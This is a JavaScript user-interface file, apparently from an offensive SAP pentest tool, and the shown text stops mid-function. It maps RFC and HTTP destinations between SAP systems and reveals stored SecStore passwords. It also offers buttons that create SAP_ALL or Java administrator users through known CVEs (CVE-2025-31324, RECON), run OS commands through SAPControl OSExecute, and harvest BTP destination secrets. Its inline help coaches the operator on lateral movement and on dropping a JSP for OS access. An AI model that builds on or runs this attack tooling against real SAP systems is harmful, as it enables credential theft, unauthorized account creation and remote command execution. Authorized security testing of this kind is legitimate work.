    // re-run → os_access_type).  Without them in the key the modal
    // shows stale MEDIUM risk and no "OS Command" button until the
    // operator closes + reopens.
    os_exec_verified:  !!c.os_exec_verified,
    os_access_type:    c.os_access_type || '',
    is_ads_dest:       !!c.is_ads_dest,
    is_btp_dest:       !!c.is_btp_dest,
    note_1177315_hit:  !!c.note_1177315_hit,
    http_status:       c.http_status || 0,
    rfc_type:          c.rfc_type || '',
  });
}

function _connInfoStartLivePoll(connIdx) {
  // One active poller at a time; clear any stale one.
  if (_connInfoPollTimer != null) {
    clearInterval(_connInfoPollTimer);
    _connInfoPollTimer = null;
  }
  _connInfoCurrentIdx = connIdx;
  _connInfoLastKey = _connInfoStateKey(
    (mapState.connections || [])[connIdx]);
  const panel = document.getElementById('info-panel');
  const POLL_MS = 750;
  _connInfoPollTimer = setInterval(() => {
    // Operator closed the modal OR opened another connection — stop.
    if (!panel.classList.contains('visible')
        || _connInfoCurrentIdx !== connIdx) {
      clearInterval(_connInfoPollTimer);
      _connInfoPollTimer = null;
      return;
    }
    const c = (mapState.connections || [])[connIdx];
    const key = _connInfoStateKey(c);
    if (key === _connInfoLastKey) return;
    _connInfoLastKey = key;
    // Re-render in place — preserve current screen coordinates so
    // the panel doesn't jump.
    const initialLeft = panel.style.left;
    const initialTop  = panel.style.top;
    const fakeEvent = {
      stopPropagation: () => {},
      clientX: parseInt(initialLeft) || 0,
      clientY: parseInt(initialTop)  || 0,
    };
    showConnInfo(fakeEvent, connIdx);
  }, POLL_MS);
}

function showConnInfo(e, connIdx) {
  e.stopPropagation();
  const conn = (mapState.connections || [])[connIdx];
  if (!conn) return;

  const panel = document.getElementById('info-panel');
  // Remember which connection this modal is for, so the poll loop can
  // re-render it when Test Connection updates the state in the
  // background.  Without this the modal shows stale data until the
  // user manually closes + reopens it.
  panel.dataset.connIdx = String(connIdx);
  panel.dataset.connKey = (conn.source_sid || '') + '|' +
                          (conn.destination_name || '');
  const isHttp = (conn.conn_type || '') === 'http';
  const isTypeT = !isHttp && !!conn.sapxpg_remote_works;
  const isTrusted = !!conn.trusted_system;
  // For HTTP destinations, show the raw RFCTYPE (G = HTTP to
  // external server; H = HTTP to ABAP system) when we've captured
  // it — operator asked for the distinction because G and H differ
  // in exploitation surface (H targets accept SOAP-RFC RFC_PING,
  // G targets typically don't).
  let connType;
  if (isHttp) {
    const rt = (conn.rfc_type || '').toUpperCase();
    if (rt === 'G')       connType = 'G — HTTP → external';
    else if (rt === 'H')  connType = 'H — HTTP → ABAP';
    else                  connType = 'HTTP';
  } else if (isTypeT) {
    connType = 'T';
  } else if (isTrusted) {
    connType = '3 Trusted';
  } else {
    connType = '3';
  }
  let risk;
  if (conn.os_exec_verified) {
    // OS shell via SAPControl OSExecute — kernel-level, beats
    // SAP_ALL and every other classification.
    risk = 'CRITICAL';
  } else if (isHttp) {
    risk = conn.has_sap_all && conn.logon_successful ? 'CRITICAL' :
      conn.logon_successful ? 'MEDIUM' :
      (conn.rfc_user && conn.secstore_password) ? 'MEDIUM' : 'UNKNOWN';
  } else if (isTypeT) {
    risk = conn.ping_ok ? 'CRITICAL' : conn.tested ? 'LOW' : 'UNKNOWN';
  } else if (isTrusted) {
    risk = 'HIGH';
  } else {
    risk = conn.has_sap_all && conn.logon_successful ? 'CRITICAL' :
      conn.logon_successful ? 'MEDIUM' : conn.tested ? 'LOW' : 'UNKNOWN';
  }
  const riskClass = 'risk-' + risk.toLowerCase();

  // Profiles / Roles are ABAP concepts; never apply to Type T
  // (TCP/IP sapxpg).  For HTTP destinations they're populated when
  // BAPI_USER_GET_DETAIL succeeds over SOAP-RFC (Phase 3a follow-up
  // to the RFC_PING credential check).
  let profilesHtml = '';
  if (!isTypeT) {
    (conn.profiles || []).forEach(p => {
      const cls = p === 'SAP_ALL' ? 'profile-item sap-all' : 'profile-item';
      profilesHtml += `<div class="${cls}">${p === 'SAP_ALL' ? '&#9888; ' : ''}${escHtml(p)}</div>`;
    });
  }

  let rolesHtml = '';
  if (!isTypeT) {
    (conn.roles || []).forEach(r => {
      rolesHtml += `<div class="profile-item">${escHtml(r)}</div>`;
    });
  }

  // For Type T, derive gateway port from target node
  let gwPort = '';
  if (isTypeT) {
    const tgt = (mapState.nodes || {})[conn.target_sid];
    if (tgt) {
      for (const inst of (tgt.instances || [])) {
        for (const [p, svc] of Object.entries(inst.ports || {})) {
          if (svc === 'gateway' || (p >= 3300 && p <= 3399)) { gwPort = p; break; }
        }
        if (gwPort) break;
      }
      if (!gwPort) {
        const nrs = (tgt.instances || []).map(i => i.instance_nr).filter(n => n !== 'XX').sort();
        gwPort = nrs.length ? '33' + nrs[0] : '3300';
      }
    }
  }

  const connLabel = isHttp ? 'HTTP' : (isTypeT ? 'TCP/IP' : 'RFC');
  panel.innerHTML = `
    <h3>${connLabel} Connection Details</h3>
    <div class="info-row"><span class="info-label">Source:</span><span class="info-val">${escHtml(conn.source_sid)} (${escHtml(conn.source_host)})</span></div>
    <div class="info-row"><span class="info-label">Target:</span><span class="info-val">${escHtml(conn.target_sid || '?')} (${escHtml(conn.target_host || '?')})</span></div>
    <div class="info-row"><span class="info-label">Destination:</span><span class="info-val">${escHtml(conn.destination_name)} (Type ${connType})</span></div>
    ${isHttp ? `
      <div class="info-row"><span class="info-label">URL:</span><span class="info-val" style="word-break:break-all">${escHtml(conn.http_url || '?')}</span></div>
      <div class="info-row"><span class="info-label">Auth type:</span><span class="info-val">${
        conn.http_auth_type === 'X509'
          ? '&#128272; X.509 client cert (mTLS)' +
              (conn.http_cert_pse
                ? ' &middot; PSE: <code>' + escHtml(conn.http_cert_pse) + '</code>'
                : '')
          : escHtml(conn.http_auth_type || '?')
      }</span></div>
      ${conn.client ? `<div class="info-row"><span class="info-label">Client:</span><span class="info-val">${escHtml(conn.client)}</span></div>` : ''}
      ${conn.http_proxy ? `<div class="info-row"><span class="info-label">Proxy:</span><span class="info-val">${escHtml(conn.http_proxy)}</span></div>` : ''}
      ${conn.http_target_platform ? `<div class="info-row"><span class="info-label">Platform:</span><span class="info-val">${escHtml(conn.http_target_platform)}</span></div>` : ''}
      <div class="info-row"><span class="info-label">User:</span><span class="info-val">${escHtml(conn.rfc_user || '?')}</span></div>
      ${conn.secstore_password ? `<div class="info-row"><span class="info-label">SecStore Pwd:</span><span class="info-val ss-reveal" style="color:#3fb950;cursor:pointer"><span class="ss-masked">&#9679;&#9679;&#9679;&#9679; (${conn.secstore_password.length} chars) — click to reveal</span><span class="ss-plain" style="display:none">${escHtml(conn.secstore_password)}</span></span></div>` : ''}
      <div class="info-section" style="color:#8b949e;font-size:11px">
        ${(() => {
          const plat = (conn.http_target_platform || '').toUpperCase();
          const u = escHtml(conn.rfc_user || 'the user');
          if (conn.http_auth_type === 'X509') {
            // Cert-auth path — the interesting one.  Kernel-proxied
            // exploitation via HTTP_CLIENT_CREATE_BY_DESTINATION is
            // the actual attack; explain it so the operator doesn't
            // assume "no password = nothing to do here".
            const pse = escHtml(conn.http_cert_pse || 'the STRUST PSE');
            const isBtp = (conn.http_url || '').includes('.hana.ondemand.com');
            const btpNote = isBtp
              ? '  Target is BTP (*.hana.ondemand.com) — kernel-proxied ' +
                'HTTP against /destination-configuration/v1/subaccountDestinations ' +
                'often yields cloud-side destination secrets in cleartext, ' +
                'closing the on-prem → cloud → on-prem loop.'
              : '';
            return `X.509 cert-auth destination — the private key stays ` +
              `on the SAP host (PSE <code>${pse}</code>), but with S_RFC + ` +
              `S_ICF on the source ABAP you can call ` +
              `<code>HTTP_CLIENT_CREATE_BY_DESTINATION</code> + ` +
              `<code>HTTP_ISSUE_REQUEST</code> and the kernel does mutual-TLS ` +
              `for you.  From the target's perspective you ARE the SAP ` +
              `system.${btpNote}`;
          }
          if (plat === 'ABAP') {
            return `ABAP HTTP destination — if ${u} carries SAP_ALL (or S_USER_GRP / S_USER_AGR with full activity) you can log straight into SAP GUI / Fiori / SOAP or call BAPI_USER_CREATE1 against the target client to mint a foothold.  Test Connection runs basic-auth, then probes profiles via direct RFC.`;
          }
          if (plat === 'JAVA') {
            return `Java HTTP destination — if ${u} has UME admin, you can log into the target Java stack's NWA / CTC ConfigServlet / Telnet console with these creds and drop a JSP for full OS access.`;
          }
          return `HTTP destination — Test Connection probes basic-auth against the URL.  When the target maps to an ABAP node, profiles + SAP_ALL get fetched via direct RFC; when it maps to a Java node, the credential goes to UME tooling.`;
        })()}
      </div>
    ` : isTypeT ? `
      <div class="info-row"><span class="info-label">Port:</span><span class="info-val">${escHtml(gwPort)}</span></div>
    ` : `
      <div class="info-row"><span class="info-label">Client:</span><span class="info-val">${escHtml(conn.client || '?')}</span></div>
      <div class="info-row"><span class="info-label">RFC User:</span><span class="info-val">${escHtml(conn.rfc_user || (isTrusted ? '(current user)' : '?'))}</span></div>
      ${isTrusted ? `<div class="info-row"><span class="info-label">Trust:</span><span class="info-val" style="color:#f0883e;font-weight:600">Trusted RFC (no stored password)</span></div>
      <div class="info-section" style="color:#d29922;font-size:11px">This destination uses assertion-ticket authentication. If the source system is compromised, an attacker can call through this destination as any user on the target — no password required. The SAP kernel signs the assertion ticket automatically.</div>` : ''}
      ${conn.secstore_password ? `<div class="info-row"><span class="info-label">SecStore Pwd:</span><span class="info-val ss-reveal" style="color:#3fb950;cursor:pointer"><span class="ss-masked">&#9679;&#9679;&#9679;&#9679; (${conn.secstore_password.length} chars) — click to reveal</span><span class="ss-plain" style="display:none">${escHtml(conn.secstore_password)}</span></span></div>` : ''}
    `}
    ${profilesHtml ? `<div class="info-section"><strong style="font-size:11px;color:#8b949e">Profiles</strong><div class="profile-list">${profilesHtml}</div></div>` : ''}
    ${rolesHtml ? `<div class="info-section"><strong style="font-size:11px;color:#8b949e">Roles</strong><div class="profile-list">${rolesHtml}</div></div>` : ''}
    ${conn.user_detail_error ? `<div class="info-section" style="color:#d29922;font-size:11px">${escHtml(conn.user_detail_error)}</div>` : ''}
    ${(() => {
      // Issue #23 — surface the fine-grained create-user reach
      // signal so the operator sees "yes, S_USER_GRP + S_USER_PRO
      // are enough" even without SAP_ALL, and vice versa.
      const p = conn.create_user_probe || '';
      const ev = conn.create_user_evidence || '';
      if (conn.can_create_user === null || conn.can_create_user === undefined) {
        if (!conn.logon_successful) return '';
        // Distinguish "never probed" from "probe ran but couldn't
        // reach a verdict" (Layer 3 blocked AND no admin role for
        // Layer 2 heuristic).  The second case gets a canary offer.
        const wasAttempted = !!(conn.create_user_probe_at
                                 || conn.create_user_probe_error);
        if (!wasAttempted) {
          return `<div class="info-section" style="color:#484f58;font-size:11px">
            <strong style="color:#8b949e">Create-user reach:</strong>
            <span style="color:#8b949e">not probed — run Test Connection to check</span></div>`;
        }
        // Inconclusive — offer canary + surface the probe error.
        const canaryBtn = (conn.rfc_user) ? (
          `<button class="btn" style="margin-left:8px;font-size:11px;padding:3px 10px;background:#d29922;color:#0d1117;font-weight:600" `
          + `onclick="runCanaryCreate('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}')" `
          + `title="Layer 4 — creates + immediately deletes a canary user. Leaves an audit trail.">`
          + `&rarr; Verify by canary</button>`
        ) : '';
        // Distill common ABAP error patterns into human hints so
        // the operator doesn't have to decode "FU_NOT_FOUND".
        let hint = '';
        const rawErr = conn.create_user_probe_error || '';
        if (/FU_NOT_FOUND/i.test(rawErr)) {
          hint = 'The RFC user lacks S_RFC for RFC_ABAP_INSTALL_AND_RUN on the target (SAP returns FU_NOT_FOUND on auth failure). Canary probe uses BAPI_USER_CREATE1 directly and typically works when that FM is blocked.';
        } else if (/not permitted in this client/i.test(rawErr)) {
          hint = 'RFC_ABAP_INSTALL_AND_RUN is blocked on this client (SCC4 / auth-check flag). Canary uses a different FM and often gets through.';
        } else if (/authorization/i.test(rawErr) || /AUTHORIZATION/.test(rawErr)) {
          hint = 'Auth check blocked from reading the answer. Canary CREATE+DELETE gives a definitive yes/no.';
        }
        const errText = rawErr
          ? `<div style="color:#484f58;font-size:10px;margin-top:6px;line-height:1.4">${escHtml(rawErr)}</div>`
          : '';
        const hintText = hint
          ? `<div style="color:#8b949e;font-size:11px;margin-top:6px;line-height:1.45"><i>${escHtml(hint)}</i></div>`
          : '';
        return `<div class="info-section">
          <strong style="font-size:11px;color:#8b949e">Create-user reach</strong>
          <div style="font-size:12px;color:#d29922;margin-top:4px">
            &#128993; Inconclusive — click <b>Verify by canary</b> for a definitive yes/no ${canaryBtn}
          </div>
          ${hintText}
          ${errText}
        </div>`;
      }
      let icon, color, label;
      if (conn.can_create_user === true) {
        if (p === 'sap_all') {
          icon = '&#128994;'; color = '#3fb950';
          label = 'Yes — SAP_ALL profile';
        } else if (p === 'authority_check') {
          icon = '&#128994;'; color = '#3fb950';
          label = 'Yes — ' + escHtml(ev);
        } else if (p === 'canary') {
          icon = '&#128994;'; color = '#3fb950';
          label = 'Yes — canary create+delete confirmed';
        } else {
          icon = '&#128993;'; color = '#d29922';
          label = 'Likely — ' + escHtml(ev);
        }
      } else {
        icon = '&#128308;'; color = '#f85149';
        label = 'No — ' + escHtml(ev || 'S_USER_GRP denied');
      }
      const canCanary = conn.logon_successful && conn.rfc_user;
      const canaryBtn = canCanary ? (
        `<button class="btn" style="margin-left:8px;font-size:10px;padding:2px 8px" `
        + `onclick="runCanaryCreate('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}')" `
        + `title="Layer 4 — creates + immediately deletes a canary user. Leaves an audit trail.">`
        + `Verify by canary</button>`
      ) : '';
      const probeErr = conn.create_user_probe_error
        ? `<div style="color:#484f58;font-size:10px;margin-top:2px">${escHtml(conn.create_user_probe_error)}</div>`
        : '';
      return `<div class="info-section">
        <strong style="font-size:11px;color:#8b949e">Create-user reach</strong>
        <div style="font-size:12px;color:${color};margin-top:2px">${icon} ${label}${canaryBtn}</div>
        ${probeErr}
      </div>`;
    })()}
    ${isHttp ? `<div class="info-section">
      <strong style="font-size:11px;color:#8b949e">DEST_CHECK_CONNECTION</strong>
      ${conn.tested ? `
        <div class="info-row"><span class="info-label">HTTP Ping:</span><span class="info-val">${conn.ping_ok ? 'OK' : 'Failed'}${conn.latency_ms ? ' ('+conn.latency_ms+'ms)' : ''}</span></div>
        ${conn.secstore_password ? `<div class="info-row"><span class="info-label">Direct RFC:</span><span class="info-val">${conn.has_sap_all ? '&#9989; Logon OK — SAP_ALL' : (conn.profiles && conn.profiles.length ? '&#9989; Logon OK' : (conn.logon_successful ? '&#9898; HTTP only' : '&#10060; Failed'))}</span></div>` : ''}
        ${conn.soap_rfc_verified ? `<div class="info-row"><span class="info-label">SOAP-RFC:</span><span class="info-val" style="color:#3fb950">&#9989; RFC_PING OK — credentials verified over HTTP</span></div>` : ''}
      ` : '<div style="color:#484f58;font-size:11px;margin-top:4px">Not tested yet</div>'}
    </div>` : `<div class="info-section">
      <strong style="font-size:11px;color:#8b949e">/SDF/RFC_CHECK</strong>
      ${conn.tested ? `
        <div class="info-row"><span class="info-label">Ping:</span><span class="info-val">${conn.ping_ok ? 'OK' : 'Failed'}${conn.latency_ms ? ' ('+conn.latency_ms+'ms)' : ''}</span></div>
        ${isTypeT ? '' : `<div class="info-row"><span class="info-label">Logon:</span><span class="info-val">${conn.logon_successful ? '&#9989; RFC Logon successful.' : (conn.logon_tested ? '&#10060; Failed' : '&#9898; Not tested')}</span></div>`}
      ` : '<div style="color:#484f58;font-size:11px;margin-top:4px">Not tested yet</div>'}
    </div>`}
    <div class="info-section">
      <div class="info-row"><span class="info-label">Risk:</span><span class="info-val"><span class="risk-badge ${riskClass}">${risk}</span></span></div>
    </div>
    ${(isHttp && conn.tested && conn.ping_ok && !conn.has_sap_all && !conn.soap_rfc_verified && conn.can_create_user !== true) ? (() => {
      const reasons = [];
      if (!conn.rfc_user) reasons.push('no RFC user on destination');
      if (!conn.target_sid) reasons.push('target SID unresolved');
      if (conn.rfc_user && conn.target_sid && !conn.secstore_password)
        reasons.push(`no password for <strong>${escHtml(conn.rfc_user)}</strong> — run SecStore extraction, or add ${escHtml(conn.rfc_user)} credentials on ${escHtml(conn.target_sid)}`);
      return reasons.length ? `<div class="info-section" style="color:#d29922;font-size:11px"><strong>Create Remote User unavailable:</strong> ${reasons.join('; ')}</div>` : '';
    })() : ''}
    ${(isHttp && conn.soap_rfc_verified && !conn.has_sap_all) ? `<div class="info-section" style="color:#8b949e;font-size:11px">Create Remote User will attempt BAPI_USER_CREATE1 + SAP_ALL via SOAP-RFC. The user's authorization for these BAPIs (S_USER_GRP, S_USER_PRO) is checked at click time.</div>` : ''}
    <div style="text-align:right;margin-top:8px;display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap">
      ${conn.os_exec_verified ? `<button class="btn" style="background:#c0392b;color:#fff;font-weight:600" onclick="openOSExecuteModal('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}')">&#9889; OS Command (via ${conn.os_exec_channel === 'ctcws' ? 'CTCWebService' : 'SAPControl'})</button>` : ''}
      ${(() => {
        // Create Remote User (Java UME) — delegates to the target's
        // existing create_user_java endpoint, which handles the JSP
        // deploy + UME UACC/USER row insertion + group assignment.
        //
        // Gate: show whenever the destination points somewhere we
        // can plausibly deploy the UME JSP.  Two branches:
        //   (a) SAPControl OSExecute already verified → we have OS
        //       shell as <sid>adm regardless of whether the classic
        //       CVEs are usable.  Fires even when the target node
        //       is a bare placeholder (system_type='', port=50NN13
        //       SAPControl not 50NN00 Java) because we know a real
        //       SID is behind the credential we just proved.  If
        //       the target turns out to be ABAP-only, the backend
        //       endpoint refuses cleanly with 'not a Java stack'.
        //   (b) target is Java (system_type has JAVA, or URL port
        //       is 5NN00/5NN01) AND has a classic Java exploit
        //       usable (CVE-31324 / RECON / GW SAPXPG).
        if (!isHttp || !conn.target_sid || !conn.logon_successful) return '';
        const tgtNode = (mapState.nodes || {})[conn.target_sid];
        if (!tgtNode) return '';
        const canSapctl = !!conn.os_exec_verified;
        let show = canSapctl;   // OSExecute branch — always show
        if (!show) {
          const tst = (tgtNode.system_type || '').toUpperCase();
          let portIsJava = false;
          try {
            const u = new URL(conn.http_url || '');
            const p = parseInt(u.port) || 0;
            portIsJava = (p >= 50000 && p <= 59999 && (p % 100 === 0 || p % 100 === 1));
          } catch(_) {}
          const isJavaTgt = tst.indexOf('JAVA') !== -1 || portIsJava;
          const canCve   = !!tgtNode.cve_2025_31324_vulnerable;
          const canRecon = !!tgtNode.cve_2020_6287_vulnerable;
          const canGw    = !!tgtNode.gw_vulnerable;
          show = isJavaTgt && (canCve || canRecon || canGw);
        }
        if (!show) return '';
        const argSrc = escHtml(conn.source_sid);
        const argDest = escHtml(conn.destination_name);
        const label = canSapctl
          ? 'Create Java User (via OSExecute)'
          : 'Create Remote User (Java UME)';
        return `<button class="btn" style="background:#b33;color:#fff" onclick="createUserOnJavaTarget('${escHtml(conn.target_sid)}','${argSrc}','${argDest}')">${label}</button>`;
      })()}
      ${(() => {
        // Create Remote User calls BAPI_USER_CREATE1 — an ABAP-side
        // BAPI.  Hide the button when the destination is unmistakably
        // pointing at a non-ABAP target (SAPControl / Java / BTP /
        // ADS) because that call will always fail with
        // "Illegal destination type 'G'" / XML parse errors.
        if (isTypeT || !conn.logon_successful || !conn.target_sid) return '';
        // Issue #23 — accept the fine-grained can_create_user reach
        // as an alternative to the has_sap_all shortcut so users with
        // S_USER_GRP + S_USER_PRO can still trigger BAPI_USER_CREATE1.
        if (!(conn.has_sap_all || conn.soap_rfc_verified
                || conn.can_create_user === true)) return '';
        const oat = (conn.os_access_type || '').toLowerCase();
        if (oat.startsWith('sapcontrol') || oat.startsWith('hostagent')) return '';
        if (conn.is_btp_dest || conn.is_ads_dest) return '';
        // Java-shaped URL port (5NN00 / 5NN01) — same logic as the
        // backend Java branch.  Extract port from URL and check.
        try {
          const u = new URL(conn.http_url || '');
          const p = parseInt(u.port) || 0;
          if (p >= 50000 && p <= 59999 && (p % 100 === 0 || p % 100 === 1)) return '';
        } catch(_) {}
        // Target node explicitly tagged JAVA / BTP.
        const tgtNode = (mapState.nodes || {})[conn.target_sid];
        if (tgtNode) {
          const st = (tgtNode.system_type || '').toUpperCase();
          if (st.indexOf('BTP') !== -1) return '';
          if (st.indexOf('JAVA') !== -1 && st.indexOf('ABAP') === -1) return '';
        }
        return `<button class="btn" style="background:#b33;color:#fff" onclick="createUserOnTarget('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}','${escHtml(conn.target_sid)}')">Create Remote User</button>`;
      })()}
      ${isTypeT ? '' :
        `<button class="btn" onclick="testConnection('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}',${connIdx})">Test Connection</button>`}
      ${conn.http_auth_type === 'X509' ? `
        <button class="btn"
                style="background:#8b3aad;color:#fff"
                title="Kernel-proxied HTTP over this cert-authenticated destination.  The SAP kernel does mutual TLS with the STRUST PSE; the operator never touches the private key.  BTP-shaped targets get automatic subaccount-destination enumeration on top."
                onclick="probeCertDest('${escHtml(conn.source_sid)}','${escHtml(conn.destination_name)}')">
          &#128272; Probe Cert-Auth
        </button>` : ''}
      <button class="btn" onclick="document.getElementById('info-panel').classList.remove('visible')">Close</button>
    </div>
  `;
  // Wire up click-to-reveal for SecStore password
  panel.querySelectorAll('.ss-reveal').forEach(row => {
    row.addEventListener('click', () => {
      const m = row.querySelector('.ss-masked');
      const p = row.querySelector('.ss-plain');
      if (m.style.display === 'none') { m.style.display = ''; p.style.display = 'none'; }
      else { m.style.display = 'none'; p.style.display = ''; }
    });
  });

  panel.style.left = Math.min(e.clientX, window.innerWidth - 440) + 'px';
  panel.style.top = Math.min(e.clientY, window.innerHeight - 520) + 'px';
  panel.classList.add('visible');

  // Start a per-modal live poller so any subsequent backend update
  // (Test Connection finishing, bulk Test RFCs filling profiles,
  // RECON-driven probe etc.) re-renders this open modal without the
  // operator having to close and re-open it.  Cheap: only re-renders
  // when the connection's state key actually changes.
  _connInfoStartLivePoll(connIdx);
}

async function testSingleRfc(sid, destName, connIdx) {
  // Just kick the backend test off.  The per-modal live-poller
  // (started in showConnInfo) catches phase-1 (tested+logon_tested)
  // and phase-2 (profiles+roles+has_sap_all) updates and re-renders
  // the modal in place when either lands.  No separate poller here.
  await api('POST', `node/${sid}/test_rfc_single`, { destination_name: destName });
  startPolling();
}

// Kernel-proxied HTTP call over a cert-authenticated Type G/H
// destination.  The backend endpoint refuses non-X509 destinations,
// so the button is only rendered when http_auth_type === 'X509'.
// Findings + operator-console output stream back through the normal
// polling loop; we just kick it off.
async function probeCertDest(sid, destName) {
  const r = await api('POST', `node/${sid}/cert_dest_probe`,
                       { destination_name: destName });
  if (r && r.error) {
    showToast('Cert-auth probe rejected: ' + r.error, 'error');
    return;
  }
  showToast('Cert-auth probe on ' + destName +
             ' — watch the console for BTP loot / status.', 'info');
  startPolling();
}

async function createUserViaRfc(sourceSid, destName, targetSid) {
  document.getElementById('info-panel').classList.remove('visible');
  await api('POST', `node/${sourceSid}/create_user_via_rfc`, {
    destination_name: destName,
    target_sid: targetSid
  });
  startPolling();
}

// Create Remote User (Java UME) on a Type-G connection's target —
// mirrors the right-click Create-User-Java prompts + delegates to the
// existing /api/node/<target>/create_user_java endpoint.  Marks the
// target node as pwned on success (via the state poll picking up
// track_created_user).
async function createUserOnJavaTarget(targetSid, sapctlSourceSid, sapctlDestName) {
  const n = (mapState.nodes || {})[targetSid];
  if (!n) { alert('Target node ' + targetSid + ' not found on map.'); return; }
  const conn = sapctlDestName
    ? (mapState.connections || []).find(
        c => c.source_sid === sapctlSourceSid
          && c.destination_name === sapctlDestName)
    : null;
  const hasSapctl = !!(conn && conn.os_exec_verified);
  const hasCve   = !!n.cve_2025_31324_vulnerable;
  const hasRecon = !!n.cve_2020_6287_vulnerable;
  const hasGw    = !!n.gw_vulnerable;
  const u = prompt('Create Java user on ' + targetSid + '\n\nUsername:', 'SAPMAP00');
  if (!u || !u.trim()) return;
  const p = prompt('Password (leave empty for random):', 'Andinyougo123!');
  if (p === null) return;
  const g = prompt('Add to group (blank = Administrators):', 'Administrators');
  if (g === null) return;
  // Default to SAPControl OSExecute when we've got it — that's the
  // channel the operator explicitly verified for this destination.
  let method = hasSapctl ? 'sapcontrol' : 'auto';
  const paths = [];
  if (hasSapctl) paths.push('"sapctl" (SAPControl OSExecute — recommended)');
  if (hasCve)    paths.push('"cve" (CVE-2025-31324)');
  if (hasRecon)  paths.push('"recon" (CVE-2020-6287 RECON)');
  if (hasGw)     paths.push('"gw" (RFC Gateway SAPXPG)');
  if (paths.length > 1) {
    const dflt = hasSapctl ? 'sapctl' : 'auto';
    const m = prompt('Method — ' + paths.join(', ') +
                      '.\nLeave "' + dflt + '" to use the highlighted default:',
                      dflt);
    if (m === null) return;
    if      (/^sapctl/i.test(m))                     method = 'sapcontrol';
    else if (/^cve/i.test(m) && !/recon/i.test(m))   method = 'cve_31324';
    else if (/^recon/i.test(m))                       method = 'recon';
    else if (/^gw/i.test(m))                          method = 'gw';
    else if (/^auto/i.test(m))                        method = 'auto';
  }
  const body = {
    username: u.trim(),
    password: (p || '').trim(),
    group:    (g || 'Administrators').trim(),
    method:   method,
  };
  if (method === 'sapcontrol') {
    if (!hasSapctl) {
      alert('SAPControl method needs a verified OSExecute connection — ' +
            'run Test Connection on the Type-G destination first.');
      return;
    }
    body.sapcontrol_source_sid = sapctlSourceSid;
    body.sapcontrol_dest_name  = sapctlDestName;
  }
  showToast(
    `Creating Java user <code>${escHtml(body.username)}</code> in ` +
    `group <code>${escHtml(body.group)}</code> on ` +
    `<strong>${escHtml(targetSid)}</strong>` +
    (method === 'sapcontrol'
      ? ' via SAPControl OSExecute — watch the console for JSP deploy progress'
      : ` via method <code>${escHtml(method)}</code>`),
    { autoCloseMs: 8000 });
  const r = await api('POST', `node/${targetSid}/create_user_java`, body);
  if (r && r.error) {
    alert('Create Java user failed: ' + r.error);
    return;
  }
  startPolling();
}

let _osExecuteCtx = { sid: '', destName: '', channel: 'sapcontrol' };
let _osExecuteDragInit = false;
function _initOSExecuteDrag() {
  if (_osExecuteDragInit) return;
  _osExecuteDragInit = true;
  const inner = document.getElementById('osexecute-modal-inner');
  const handle = document.getElementById('osexecute-drag-handle');
  if (!inner || !handle) return;
  let dragging = false, dx = 0, dy = 0;
  handle.addEventListener('mousedown', (e) => {
    if (e.target.closest('button, a, input')) return;
    dragging = true;
    const rect = inner.getBoundingClientRect();
    // Switch from centred flex layout to absolute positioning on
    // first drag so subsequent moves are stable.
    inner.style.position = 'absolute';
    inner.style.left = rect.left + 'px';
    inner.style.top = rect.top + 'px';
    inner.style.margin = '0';
    dx = e.clientX - rect.left;
    dy = e.clientY - rect.top;
    e.preventDefault();
  });
  document.addEventListener('mousemove', (e) => {
    if (!dragging) return;
    const nx = Math.max(0, Math.min(window.innerWidth  - 100, e.clientX - dx));
    const ny = Math.max(0, Math.min(window.innerHeight - 40,  e.clientY - dy));
    inner.style.left = nx + 'px';
    inner.style.top  = ny + 'px';
  });
  document.addEventListener('mouseup', () => { dragging = false; });

  // Bottom-right resize handle — drag to change size.
  const rh = document.getElementById('osexecute-resize-handle');
  if (rh) {
    let rz = false, sx = 0, sy = 0, sw = 0, sh = 0;
    rh.addEventListener('mousedown', (e) => {
      rz = true;
      const rect = inner.getBoundingClientRect();
      sx = e.clientX; sy = e.clientY;
      sw = rect.width; sh = rect.height;
      e.preventDefault();
      e.stopPropagation();
    });
    document.addEventListener('mousemove', (e) => {
      if (!rz) return;
      const nw = Math.max(520, sw + (e.clientX - sx));
      const nh = Math.max(400, sh + (e.clientY - sy));
      inner.style.width  = nw + 'px';
      inner.style.height = nh + 'px';
    });
    document.addEventListener('mouseup', () => { rz = false; });
  }
}
function openOSExecuteModal(sid, destName) {
  _osExecuteCtx.sid = sid;
  _osExecuteCtx.destName = destName;
  const conn = (mapState.connections || []).find(
    c => c.source_sid === sid && c.destination_name === destName);
  // Route to the right SOAP endpoint.  os_exec_channel is set by the
  // pivot probe (SAPControl or CTCWebService); legacy state files
  // without the field fall back to SAPControl — that was the only
  // channel before ctcws existed.
  _osExecuteCtx.channel = (conn && conn.os_exec_channel) || 'sapcontrol';
  const channelLabel = _osExecuteCtx.channel === 'ctcws'
    ? 'CTCWebService' : 'SAPControl OSExecute';
  const titleEl = document.querySelector('#osexecute-drag-handle h3');
  if (titleEl) {
    titleEl.innerHTML = `&#9889; OS Command via ${escHtml(channelLabel)}`
      + `<span style="float:right;font-size:10px;color:#484f58;font-weight:400">`
      + `drag header to move · resize from bottom-right</span>`;
  }
  const info = conn
    ? `<strong>${escHtml(sid)}</strong> &rarr; ${escHtml(conn.target_sid || '?')} `
      + `via <code>${escHtml(destName.slice(0, 32))}${destName.length > 32 ? '…' : ''}</code>`
      + ` &nbsp; <span style="color:#8b949e">as ${escHtml(conn.rfc_user || '?')} on ${escHtml(conn.http_url || '?')}</span>`
      + ` &nbsp; <span style="color:#c0392b;font-weight:600">[${escHtml(channelLabel)}]</span>`
    : `${escHtml(sid)} &rarr; ${escHtml(destName)}`;
  document.getElementById('osexecute-context').innerHTML = info;
  document.getElementById('osexecute-cmd').value = 'whoami';
  document.getElementById('osexecute-timeout').value = '30';
  document.getElementById('osexecute-output').textContent = '';
  document.getElementById('osexecute-modal').classList.add('visible');
  _initOSExecuteDrag();
  setTimeout(() => document.getElementById('osexecute-cmd').focus(), 50);
}
async function runOSExecute() {
  const cmd = (document.getElementById('osexecute-cmd').value || '').trim();
  const timeout = parseInt(document.getElementById('osexecute-timeout').value) || 30;
  const outEl = document.getElementById('osexecute-output');
  if (!cmd) { alert('Command required.'); return; }
  outEl.textContent = `[*] Running: ${cmd}\n[*] Timeout: ${timeout}s\n[*] Waiting for output…\n`;
  outEl.scrollTop = outEl.scrollHeight;
